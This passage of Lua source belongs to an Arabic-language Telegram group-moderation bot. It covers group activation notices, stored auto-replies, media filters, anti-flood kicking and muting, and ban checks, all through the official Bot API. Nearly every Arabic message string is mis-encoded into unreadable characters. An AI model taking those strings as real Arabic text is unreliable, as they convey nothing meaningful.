Devmfm:sadd(mustafa.."mfm:Groups",msg.chat_id_)
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω β β₯‘ \nββββ EB ββββ\nβ β« Ψ¨ΩΨ§Ψ³Ψ·Ψ© β "..Name.."\nβ β« ΩΩΩΨΉΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β "..status.."\nβ β« Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..NameChat.."]\nβ β« ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β¨ *"..NumMem.."* β©\nβ β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nβ¨ `"..msg.chat_id_.."` β©\nβ β« Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘\nβ¨ ["..LinkGroup.."] β©\nββββ EB ββββ\nβ β« Ψ§ΩΩΩΨͺ β "..os.date("%I:%M%p").."\nβ β« Ψ§ΩΨͺΨ§Ψ±ΩΨ? β "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨΉΩΩ ΩΨ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', 1, 'md') 
end 
end 
--     Source Escobar     --
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source Escobar     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Devmfm:set(mustafa..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Escobar     --
local ReFalse = tostring(msg.chat_id_)
if not Devmfm:sismember(mustafa.."mfm:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source Escobar     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if Devmfm:get(mustafa..'mfm:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, dp.id_)
local Text = 'β β« Ψ§ΩΩΨ§ ΨΉΨ²ΩΨ²Ω β« ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\nβ β« ΩΨ¬Ψ¨ ΨΉΩΩΩΨ§ Ψ§ΩΨͺΨ£ΩΨ― Ψ£ΩΩ ΩΨ³Ψͺ Ψ±ΩΨ¨ΩΨͺ\nβ β« ΨͺΩ ΨͺΩΩΨ―Ω Ψ§ΨΆΨΊΨ· Ψ§ΩΨ²Ψ± Ψ¨Ψ§ΩΨ§Ψ³ΩΩ ΩΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {{{text="Ψ§ΨΆΨΊΨ· ΩΩΨ§ ΩΩΩ ΨͺΩΩΨ―Ω",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if Devmfm:get(mustafa.."mfm:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ’Ωΰ’ͺΨ³Ϋ§ΩΨͺΩΨ§ ΨͺΩΩΩΩ ΩΩΨΉΩΨ§ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ§ΩΨͺΩ Ψ’Ωΰ’ͺΨ³Ϋ§ΩΨͺΩΨ§ ΨͺΩΩΩΩ ΩΩΨΉΩΨ§ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« Ψ§ΩΩΩΨ΅Ω Ψ§ΩΨ°Ω Ψ’Ωΰ’ͺΨ³Ϋ§ΩΨͺΩ ΨͺΩΩΩΩ ΩΩΨΉΩ ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source Escobar     --
if text and text:match("^(.*)$") then
local DelGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if DelGpRed == 'DelGpRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΩΩΩΩ β '..msg.content_.text_..' ΨͺΩΩΩΩ Ψ­Ψ°ΩΩΨ§',  1, "html")
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:srem(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΩΩΩΩ β '..msg.content_.text_..' ΨͺΩΩΩΩ Ψ­Ψ°ΩΩΨ§',  1, "html")
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
Devmfm:del(mustafa.."mfm:Gif:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Voice:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Audio:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Photo:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Video:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:File:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Text:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Escobar     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SaveGpRed == 'SaveGpRed' then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then
local DelManagerRep = Devmfm:get(mustafa..'DelManagerRep'..msg.chat_id_..'')
Devmfm:srem(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',DelManagerRep)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ―', 1, 'md')
Devmfm:del(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_)
Devmfm:del(mustafa..'DelManagerRep'..msg.chat_id_..'')
return false
end
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
local SaveGpRed = Devmfm:get(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then Devmfm:set(mustafa..'mfm:Video:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then Devmfm:set(mustafa..'mfm:File:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then Devmfm:set(mustafa..'mfm:Stecker:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then Devmfm:set(mustafa..'mfm:Voice:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then Devmfm:set(mustafa..'mfm:Audio:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Devmfm:set(mustafa..'mfm:Photo:GpRed'..SaveGpRed..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then Devmfm:set(mustafa..'mfm:Gif:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
Devmfm:set(mustafa..'mfm:Text:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ§ΩΨ¬Ψ―ΩΨ―', 1, 'md') 
Devmfm:del(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'DelManagerRep'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not Devmfm:get(mustafa..'mfm:Lock:GpRed'..msg.chat_id_) then 
if Devmfm:get(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..''))
end
if Devmfm:get(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then
function mustafaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ΩΨ§ ΩΩΨ¬Ψ―' end
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Devmfm:get(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end
--     Source Escobar     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then
local DelSudoRep = Devmfm:get(mustafa..'DelSudoRep')
Devmfm:del(mustafa.."mfm:Sudo:AllRed",DelSudoRep)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ―', 1, 'md')
Devmfm:del(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
Devmfm:del(mustafa.."DelSudoRep")
return false
end
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = Devmfm:get(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
Devmfm:set(mustafa.."mfm:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
Devmfm:set(mustafa.."mfm:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
Devmfm:set(mustafa.."mfm:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
Devmfm:set(mustafa.."mfm:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
Devmfm:set(mustafa.."mfm:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Devmfm:set(mustafa.."mfm:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
Devmfm:set(mustafa.."mfm:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
Devmfm:set(mustafa.."mfm:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ§ΩΨ¬Ψ―ΩΨ―', 1, 'md') 
Devmfm:del(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
Devmfm:del(mustafa..'DelSudoRep')
return false end end
if msg.content_.text_ and not Devmfm:get(mustafa..'mfm:Lock:AllRed'..msg.chat_id_) then
if Devmfm:get(mustafa.."mfm:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:Video:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:File:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Voice:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Audio:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Photo:AllRed"..msg.content_.text_))
end
if  Devmfm:get(mustafa.."mfm:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Gif:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Text:AllRed"..msg.content_.text_) then
function mustafaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ΩΨ§ ΩΩΨ¬Ψ―' end
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Devmfm:get(mustafa.."mfm:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end 
--     Source Escobar     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β '..GetName..' \nβ β« ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ§ΩΩΨ­Ψ―Ψ― ΨͺΩΩΩΩ Ψ·Ωΰ’ͺΪΩΫ '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '*β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β * '..GetName..' \n *β β« ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ§ΩΩΨ­Ψ―Ψ― ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« *'
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, msg.sender_user_id_) then
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '*β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β *'..GetName..' \n*β β« ΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ§ΩΩΨ­Ψ―Ψ― ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€* '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions mustafa --
--     Source Escobar     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= mustafa then
floods = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(Devmfm:get(mustafa.."mfm:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
Devmfm:setex(mustafa.."mfm:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Escobar     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(mustafa) then
Devmfm:set(mustafa..'mfm:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = Devmfm:get(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
if pin_id and Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if Devmfm:get(mustafa..'mfm:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
Devmfm:del(mustafa..'mfm:viewget'..msg.sender_user_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― ΩΨ΄Ψ§ΩΨ―Ψ§Ψͺ Ψ§ΩΩΩΨ΄ΩΨ± ΩΩ β ('..msg.views_..')', 1, 'md')
Devmfm:del(mustafa..'mfm:viewget'..msg.sender_user_id_)
end
end
--     Source Escobar     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
